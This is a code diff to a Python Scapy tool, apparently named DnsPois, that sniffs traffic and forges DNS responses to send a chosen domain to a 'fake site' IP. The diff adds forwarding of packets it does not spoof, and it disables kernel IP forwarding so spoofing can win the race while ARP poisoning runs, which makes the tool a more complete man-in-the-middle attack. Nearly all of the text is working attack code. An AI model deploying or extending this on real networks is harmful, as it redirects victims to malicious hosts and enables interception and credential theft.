@@ -16,7 +16,17 @@ class DnsPois:
 
     @staticmethod
     def responder(auth_ip, rec_ip, mal_ip, domain):
+        """
+        Forwards a packet to the original recipient if it is not a packet we wish to falsify
+        """
+        def forward(pkt):
+            send(pkt, verbose=1)
 
+        """
+        Looks at a packet and decides whether it contains a DNS response for the domain we wish to spoof
+        if so we falsify the packet
+        if not we forward the packet to its original recipient
+        """
         def get_resp(pkt):
 
             # print(pkt.show())
@@ -32,8 +42,10 @@ class DnsPois:
                     send(spf_resp, verbose=1)
                     return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
                 else:
+                    forward(pkt)
                     return "Don't care " + str(pkt['DNS Question Record'].qname)
             else:
+                forward(pkt)
                 return "Don't care"
 
         return get_resp
@@ -49,5 +61,15 @@ class DnsPois:
         print("auth server: " + self.auth_ip)
         print("NS: " + self.rec_ip)
         print("Fake site: " + self.mal_ip)
+        # Since ARP poisoning ongoing is a prerequisite
+        # We have to turn off automatic forwarding
+        # else the packets are forwarded before we can spoof them
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+                ipf.write('0\n')
+            print("Turned off auto forward pilot, switching to manual..")
+        except FileNotFoundError:
+            pass
 
-        sniff(prn=self.responder(self.auth_ip, self.rec_ip, self.mal_ip, self.domain))
+        sniff(prn=self.responder(self.auth_ip,
+                                 self.rec_ip, self.mal_ip, self.domain))
